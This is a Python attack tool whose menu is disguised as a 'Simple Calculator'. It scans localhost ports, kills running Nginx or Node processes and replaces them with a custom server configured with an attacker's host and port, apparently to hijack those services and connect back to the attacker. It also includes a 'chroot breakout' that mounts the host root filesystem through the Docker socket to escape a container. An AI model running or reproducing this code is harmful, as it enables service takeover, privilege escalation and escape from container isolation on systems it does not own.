
import socket
from process_manager_nginx import ProcessManagerForNginx
from process_manager_node import ProcessManagerNode
from custom_server import CustomServer 
import ctypes
import os
import subprocess
import asyncio
import time




def _scan_localhost_ports(start_port=1, end_port=65535):
    print("Scanning localhost for open ports...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)  # Small timeout for quick scanning
            result = s.connect_ex(("127.0.0.1", port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open")

    return open_ports


def _run_docker_chroot():
    """Runs a Docker container with chroot access using the Docker socket."""
    docker_command = [
        "docker", "-H", "unix:///var/run/docker.sock", "run",
        "-v", "/:/mnt", "-it", "alpine", "chroot", "/mnt"
    ]
    
    try:
        subprocess.run(docker_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ Error executing Docker command: {e}")
    except FileNotFoundError:
        print("❌ Docker is not installed or accessible. Make sure Docker is running.")


def _has_chroot_capability():
    """Checks if the current process has permission to use chroot."""
    
    # Check if running as root (chroot requires root privileges)
    if os.geteuid() != 0:
        print("❌ Chroot requires root privileges. Current user is not root.")
        return False
    
    try:
        # Use ctypes to call chroot (this will fail if not permitted)
        libc = ctypes.CDLL("libc.so.6")
        result = libc.chroot(b"/")
        
        if result == 0:
            print("✅ Chroot capability is available.")
            return True
        else:
            print("❌ Chroot capability is NOT available.")
            return False
            
    except Exception as e:
        print(f"⚠️ Error checking chroot capability: {e}")
        return False
    


async def phantomHydraAttackForNginx(port_start, port_end, attack_host, attack_port):
    _scan_localhost_ports(port_start, port_end)
    port = int(input("Enter Open Port on which you want to continue: "))

    custom_server = CustomServer(port=port)
    custom_server.generate_script_for_attack(host=attack_host, port=attack_port)

    processManager = ProcessManagerForNginx(port=port)

    await processManager.kill_process_on_port()

    if await processManager.is_nginx_running():
        await processManager.stop_nginx()
    time.sleep(120)
    int(input("Press 1 to start the custom server"))
    custom_server.start_server()

async def phantomHydraAttackForNode(port_start, port_end, attack_host, attack_port):
    _scan_localhost_ports(port_start, port_end)
    port = int(input("Enter Open Port on which you want to continue: "))
    killer = ProcessManagerNode(process_name="node")  # Change process name if needed
    await killer.kill_process()
    custom_server = CustomServer(port=port)
    custom_server.generate_script_for_attack(host=attack_host, port=attack_port)
    time.sleep(2)
    custom_server.start_server()
    
    

def chrootBreakOutExploit():
    has_chroot_permission = _has_chroot_capability()
    if(has_chroot_permission):
        _run_docker_chroot()


def main():
    while True:
        print("\nSimple Calculator")
        print("1. Phantom Hydra Attack For Nginx Services 🐍👻")
        print("2. Phantom Hydra Attack For Node Services 🏴‍☠️🔓")
        print("3. Chroot Breakout Exploit 🏴‍☠️🔓")
        print("0. Exit")

        choice = input("Select an operation (1-5): ")

        if choice == '0':
            print("Exiting calculator. Goodbye!")
            break

        if choice not in ['1', '2', '3', '4']:
            print("Invalid choice. Please select a valid option.")
            continue
        if choice == '1':
            try:
                attack_host = input("Enter Attacker's host: ")
                attack_port = input("Enter Attacker's port:")
                print("\nEnter the range of port you want to scan")
                port_1 = int(input("Enter Starting Port: "))
                port_2 = int(input("Enter Ending Port:"))
            except ValueError:
                print("Invalid input. Please enter numeric values.")
            asyncio.run(phantomHydraAttackForNginx(port_1, port_2, attack_host, attack_port))
        elif choice =='2':
            try:
                attack_host = input("Enter Attacker's host: ")
                attack_port = input("Enter Attacker's port:")
                print("\nEnter the range of port you want to scan")
                port_1 = int(input("Enter Starting Port: "))
                port_2 = int(input("Enter Ending Port:"))
            except ValueError:
                print("Invalid input. Please enter numeric values.")
            asyncio.run(phantomHydraAttackForNode(port_1, port_2, attack_host, attack_port))
        elif choice == '3':
            chrootBreakOutExploit()


if __name__ == "__main__":
    main()
